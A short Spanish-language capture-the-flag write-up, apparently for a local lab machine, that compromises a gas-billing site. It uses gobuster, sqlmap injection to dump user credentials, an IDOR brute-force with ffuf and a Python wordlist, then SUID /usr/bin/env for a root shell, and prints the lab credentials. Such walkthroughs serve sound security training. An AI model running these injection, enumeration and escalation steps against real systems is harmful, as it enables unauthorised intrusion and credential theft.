## Reconocimiento:

Puerto 22  : SSH

Puerto 80 : HTTP

En la web hay una página de un servicio de gas, no puedo hacer mucho y hago fuzzing:

```bash
gobuster dir -u http://172.17.0.2:80 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x html,zip,php,txt,bak,sh -b 404 -t 60
```

Encuentro /bills.

Dentro hay un panel de login, al cuál decido hacerle una sql injection con Sqlmap:

```bash
sqlmap -r request.txt --batch --dbs
```

Encuentro la base de datos llamada “register”, que es la que interesa:

```bash
sqlmap -r request.txt --batch -D register --tables
```

Encuentro la base de datos “users”:

```bash
sqlmap -r request.txt--batch -D register -T users -C username,passwd --dump
```

Encuentro credenciales de 3 usuarios, las pruebo en ssh y no funcionan. Así que uso la de admin para el portal del directorio /billls y entro.

```bash
User : admin
Pass : admin123
```

Dentro veo que las facturas se manejan por Id`s, así que estamos frente a una vulnerabilidad IDOR ( Insecure Direct Object Reference). 

Veo que las facturas se guardan por un numero de tipo “xya###”, así que me creo un diccionario usando python con posibles combinaciones:

```python
lista = [f"xy{c}{n:03d}" for c in 'abcdefghijklmnopqrstuvwxyz' for n in range(1000)]
with open("xy_combinaciones.txt", "w") as f:
    f.write("\n".join(lista))
```

Luego utilizo la herramienta Ffuf para el ataque agregando también la PHPSESSID:

```bash
ffuf -u 'http://172.17.0.2/bills/panel.php?id=FUZZ' -w xy_combinaciones.txt -b 'PHPSESSID=' -fw 2616 -fs 6163 -c
```

Encuentro “xyc724”, el cuál tiene las credenciales de SSH:

```python
User : duque
Pass : duquelaje81029557!
```

## Escalada

```bash
find / -perm -4000 2>/dev/null
# Info:
/usr/bin/env
```

Gracias GTFO Bins:

```bash
/usr/bin/env /bin/sh -p
```

Listo.
